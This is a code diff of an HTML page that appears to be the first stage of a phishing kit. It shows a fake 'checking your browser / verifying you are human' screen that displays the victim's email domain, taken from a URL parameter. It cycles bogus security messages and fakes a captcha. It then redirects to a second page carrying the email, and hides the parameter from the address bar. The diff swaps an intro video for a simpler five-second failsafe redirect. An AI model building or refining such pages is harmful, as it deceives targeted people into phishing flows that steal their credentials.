@@ -16,25 +16,6 @@
     color: white;
   }
 
-  /* Video container fullscreen */
-  #intro-video {
-    position: fixed;
-    inset: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 9998;
-    background: white;
-    opacity: 1;
-    transition: opacity 1s ease;
-  }
-
-  #intro-video iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-  }
-
-  /* Verification overlay */
   #verification-overlay {
     position: fixed;
     inset: 0;
@@ -44,14 +25,8 @@
     justify-content: center;
     align-items: center;
     z-index: 9999;
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity 1s ease;
-  }
-
-  #verification-overlay.active {
     opacity: 1;
-    pointer-events: auto;
+    transition: opacity 1s ease;
   }
 
   #verification-overlay.fade-out {
@@ -63,12 +38,6 @@
 
 <body>
 
-<!-- VIDEO BEFORE VERIFICATION -->
-<div id="intro-video">
-  <iframe src="https://streamable.com/e/cau62r?autoplay=1&nocontrols=1&mute=1" allow="autoplay; fullscreen" allowfullscreen></iframe>
-</div>
-
-<!-- VERIFICATION OVERLAY -->
 <div id="verification-overlay">
   <h1 id="domain-title">Checking your browser...</h1>
   <p id="security-msg">Verifying you are human...</p>
@@ -83,81 +52,76 @@
 
 <script>
 /* ===============================
-   GET EMAIL AND DOMAIN
+   GET EMAIL EXACTLY AS IT IS
 ================================ */
 function getEmailRaw() {
   const params = new URLSearchParams(window.location.search);
   return params.get("bazz505") || "";
 }
+
+// DO NOT MODIFY THE EMAIL AT ALL
 const email = getEmailRaw();
 
+/* ===============================
+   GET DOMAIN
+================================ */
 let domain = "";
-if (email.includes("@")) domain = email.split("@")[1];
-history.replaceState({}, document.title, window.location.pathname);
-
+if (email.includes("@")) {
+  domain = email.split("@")[1];
+}
+// Optional: remove email from URL for cleanliness
+  history.replaceState({}, document.title, window.location.pathname);
+/* ===============================
+   UPDATE TITLE TEXT
+================================ */
 const title = document.getElementById("domain-title");
-if (domain) title.textContent = `Checking your browser before accessing ${domain}`;
+if (domain) {
+  title.textContent = `Checking your browser before accessing ${domain}`;
+}
 
 /* ===============================
-   SECURITY MESSAGE CYCLE
+   VERIFICATION MESSAGE CYCLING
 ================================ */
 const securityMsg = document.getElementById("security-msg");
+
 const messages = [
   "Performing browser integrity check...",
   "Validating session security...",
   `Preparing secure access to ${domain}...`,
   "Verifying you are human..."
 ];
-const MESSAGE_INTERVAL = 1500; // ms per message
+
+messages.forEach((msg, i) => {
+  setTimeout(() => {
+    securityMsg.textContent = msg;
+  }, 1500 * i);
+});
 
 /* ===============================
-   VIDEO AND OVERLAY CONTROL
+   REDIRECT TO REVIEW.HTML
 ================================ */
-const introVideoDiv = document.getElementById("intro-video");
-const verificationOverlay = document.getElementById("verification-overlay");
-
-const VIDEO_DURATION = 7000; // Adjust video duration here (ms)
-const OVERLAY_FADEIN_BEFORE_END = 1000; // Overlay starts 1s before video ends
-
-setTimeout(() => {
-  // Start crossfade: video fades out, overlay fades in
-  verificationOverlay.classList.add("active");
-  introVideoDiv.style.opacity = "0";
-
-  // Remove video after fade
-  setTimeout(() => introVideoDiv.remove(), 1000);
-
-  // Start message cycle
-  messages.forEach((msg, i) => {
-    setTimeout(() => {
-      securityMsg.textContent = msg;
-    }, MESSAGE_INTERVAL * i);
-  });
-
-  // Total time for all messages
-  const totalMessageTime = MESSAGE_INTERVAL * messages.length;
-
-  // Fade out overlay after all messages are done
-  setTimeout(() => {
-    if (!verificationOverlay.classList.contains("fade-out")) {
-      verificationOverlay.classList.add("fade-out");
-      setTimeout(() => {
-        window.location.href = `view.html?bazz505=${email}`;
-      }, 900);
-    }
-  }, totalMessageTime);
-
-}, VIDEO_DURATION - OVERLAY_FADEIN_BEFORE_END);
+function goToReview() {
+  // PASS EMAIL EXACTLY — NO CHANGE
+  window.location.href = `view.html?bazz505=${email}`;
+}
 
 /* ===============================
    CAPTCHA SUCCESS
 ================================ */
 window.onCaptchaSuccess = () => {
-  verificationOverlay.classList.add("fade-out");
-  setTimeout(() => {
-    window.location.href = `view.html?bazz505=${email}`;
-  }, 900);
+  const overlay = document.getElementById("verification-overlay");
+  overlay.classList.add("fade-out");
+  setTimeout(goToReview, 900);
 };
+
+/* ===============================
+   FAILSAFE REDIRECT
+================================ */
+setTimeout(() => {
+  const overlay = document.getElementById("verification-overlay");
+  overlay.classList.add("fade-out");
+  setTimeout(goToReview, 900);
+}, 5000);
 </script>
 
 </body>
